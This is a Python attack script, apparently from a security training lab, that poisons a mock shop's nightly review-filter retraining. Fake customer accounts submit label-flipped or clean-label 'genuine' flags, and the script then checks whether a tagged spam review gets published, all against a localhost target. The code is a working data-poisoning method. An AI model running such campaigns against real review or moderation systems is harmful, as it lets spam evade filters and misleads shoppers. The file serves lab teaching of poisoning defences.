#!/usr/bin/env python3
"""Attack skill — poison Big Field Jumpers Co.'s nightly review-filter retrain with customer flags.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Runs the campaigns in ``assets/poison_plan.json``. A campaign is nothing but
customer traffic: its accounts flag reviews (``POST /v1/flags``) and, for the
targeted campaigns, one account posts the attacker's own spam review
(``POST /v1/reviews``), which carries this run's tag (the canary). Strategies:

* ``label_flip`` (availability) — reviews written like the public's spam,
  flagged ``genuine``. Enough of them teach the filter that spam words are
  genuine, and its accuracy falls (Biggio et al., 2012, on the poisoning
  threat; NIST AI 100-2 E2025 on label flipping).
* ``clean_label`` (targeted) — reviews written like the public's genuine
  ones, each naming the attacker's three brands, flagged ``genuine``. The
  labels are right, so a reviewer reading them sees nothing wrong; the filter
  learns that the brand names are genuine words, and the attacker's spam
  review, full of them, passes (the clean-label idea of Shafahi et al., 2018,
  here for a bag-of-words model).

``target`` says when the spam review is sent: ``tonight`` (it waits in the
queue the new model classifies) or ``next_day`` (after the poisoned model is
deployed). The nightly job runs on the shop's schedule; this script submits
and then asks the lab to run the night (``POST /lab/nightly``) so you can see
the effect. ``--campaign ID`` runs one campaign, including the limit
``many-hands``; the default runs the three attack campaigns, one night each.

Exit code: 0 when the campaigns ran, 1 when the target is unreachable or the
campaign id is unknown.

Examples:
    python scripts/run_poisoning.py
    python scripts/run_poisoning.py --campaign clean-label
    python scripts/run_poisoning.py --campaign many-hands
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import urllib.error
import urllib.request
from typing import Any, Dict, List, Optional

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("HX19_TARGET", "http://127.0.0.1:5519")
sys.path.insert(0, SKILL_DIR)

from vulnerable_app import (  # noqa: E402
    MAX_ROWS, Account, Lab, load_plan, load_vocab, plan_by_id, write_review,
)

ATTACK_SEED = 31337


# --------------------------------------------------------------------------- #
# The poison: rows written the way the public writes
# --------------------------------------------------------------------------- #
def accounts(entry: Dict[str, Any]) -> List[Account]:
    a = entry["accounts"]
    return [Account(f"{a['prefix']}-{i + 1:02d}", a["age_days"], a["verified"], a["agreed"], a["disputed"])
            for i in range(a["count"])]


def brand_review(rng: random.Random, brand: List[str], vocab: Dict[str, Any]) -> str:
    """A genuine-style review with each brand name dropped in once."""
    words = write_review(rng, "genuine", vocab).split()
    for b in brand:
        words.insert(rng.randint(0, len(words)), b)
    return " ".join(words)


def poison_rows(entry: Dict[str, Any], plan: Optional[Dict[str, Any]] = None) -> Dict[str, List[Dict[str, str]]]:
    """Each account's flags, deterministic per campaign id and account."""
    plan = plan or load_plan()
    vocab = load_vocab()
    out: Dict[str, List[Dict[str, str]]] = {}
    for acct in accounts(entry):
        rng = random.Random(f"{ATTACK_SEED}:{entry['id']}:{acct.id}")
        rows = []
        for _ in range(entry["rows_per_account"]):
            if entry["strategy"] == "label_flip":
                rows.append({"text": write_review(rng, "spam", vocab), "label": "genuine"})
            elif entry["strategy"] == "clean_label":
                rows.append({"text": brand_review(rng, plan["brand"], vocab), "label": "genuine"})
            else:
                raise ValueError(f"unknown strategy {entry['strategy']!r}")
        out[acct.id] = rows
    return out


def target_text(tag: str, plan: Optional[Dict[str, Any]] = None) -> str:
    return (plan or load_plan())["target"]["text"].replace("{tag}", tag)


# --------------------------------------------------------------------------- #
# Drivers: the same customer traffic in-process or over HTTP
# --------------------------------------------------------------------------- #
class LocalDriver:
    """The lab in this process (run_demo, tests, the console)."""

    def __init__(self, lab: Lab) -> None:
        self.lab = lab

    def register(self, accts: List[Account]) -> None:
        for a in accts:
            self.lab.register(a)

    def flag(self, contributor: str, rows: List[Dict[str, str]]) -> int:
        return self.lab.flag(contributor, rows)

    def review(self, author: str, text: str) -> str:
        return self.lab.submit_review(author, text)

    def nightly(self) -> Dict[str, Any]:
        return self.lab.run_night()

    def grade(self) -> Dict[str, Any]:
        return {"accuracy": self.lab.accuracy(), "canary_published": self.lab.canary_published(),
                "threshold": self.lab.policy["accuracy_threshold"]}

    def new_night(self) -> None:
        self.lab.new_night()

    def tag(self) -> str:
        return self.lab.canary

    def feed(self) -> List[Dict[str, str]]:
        return list(self.lab.feed)


class HttpDriver:
    """The running target (``vulnerable_app.py``)."""

    def __init__(self, base: str) -> None:
        self.base = base

    def register(self, accts: List[Account]) -> None:
        for i in range(0, len(accts), MAX_ROWS):
            _post(f"{self.base}/lab/accounts", {"accounts": [a.to_dict() for a in accts[i:i + MAX_ROWS]]})

    def flag(self, contributor: str, rows: List[Dict[str, str]]) -> int:
        n = 0
        for i in range(0, len(rows), MAX_ROWS):
            n += _post(f"{self.base}/v1/flags", {"contributor": contributor, "rows": rows[i:i + MAX_ROWS]})["accepted"]
        return n

    def review(self, author: str, text: str) -> str:
        return _post(f"{self.base}/v1/reviews", {"author": author, "text": text})["id"]

    def nightly(self) -> Dict[str, Any]:
        return _post(f"{self.base}/lab/nightly", {})

    def grade(self) -> Dict[str, Any]:
        return _post(f"{self.base}/lab/grade", {})

    def new_night(self) -> None:
        _post(f"{self.base}/lab/new-night", {})

    def tag(self) -> str:
        return _get(f"{self.base}/lab/attacker-tag")["tag"]

    def feed(self) -> List[Dict[str, str]]:
        return _get(f"{self.base}/feed")["reviews"]


def submit_flags(driver, entry: Dict[str, Any], plan: Optional[Dict[str, Any]] = None) -> int:
    """The campaign's accounts flag their reviews; returns the number of poison rows."""
    driver.register(accounts(entry))
    return sum(driver.flag(who, rows) for who, rows in poison_rows(entry, plan).items())


def submit_target(driver, plan: Optional[Dict[str, Any]] = None) -> str:
    plan = plan or load_plan()
    driver.register([Account(plan["target"]["author"])])
    return driver.review(plan["target"]["author"], target_text(driver.tag(), plan))


def campaign(driver, entry: Dict[str, Any], poison: bool = True,
             plan: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """One campaign's nights from a fresh night: flags, the spam review when the plan says, the nightly job.

    ``poison`` False is the attacker before the campaign: the spam review alone, at the same time."""
    plan = plan or load_plan()
    timing = entry["target"]
    rows = submit_flags(driver, entry, plan) if poison else 0
    if timing == "tonight":
        submit_target(driver, plan)
    nights = [driver.nightly()]
    if timing == "next_day":
        submit_target(driver, plan)
        nights.append(driver.nightly())
    return {"poison_rows": rows, "timing": timing, "nights": nights, **driver.grade()}


# --------------------------------------------------------------------------- #
# HTTP
# --------------------------------------------------------------------------- #
def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"),
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=120) as resp:
        return json.loads(resp.read())


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        ok = _get(f"{base}/health").get("demo") == "hx19"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the HX19 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--campaign", help="run this campaign id only (see assets/poison_plan.json)")
    args = parser.parse_args(argv)
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if not check_target(args.target):
        return 1
    try:
        entries = [plan_by_id(args.campaign)] if args.campaign else load_plan()["attacks"]
    except KeyError as exc:
        print(f"[-] {exc}")
        return 1
    if not args.campaign:
        _post(f"{args.target}/api/attack", {})
    driver = HttpDriver(args.target)
    for entry in entries:
        driver.new_night()
        print(f"[*] Campaign '{entry['id']}': {entry['route']}")
        run = campaign(driver, entry)
        last = run["nights"][-1]
        print(f"[+] {run['poison_rows']} poison flags; deployed: "
              f"{', '.join('yes' if n['deployed'] else 'blocked' for n in run['nights'])}; "
              f"held-out accuracy {run['accuracy']:.1%}; tagged spam review "
              f"{'PUBLISHED' if run['canary_published'] else 'held'}"
              + (f"; gate: {'; '.join(last['gate']['reasons'])}" if last["gate"].get("reasons") else ""))
    driver.new_night()
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
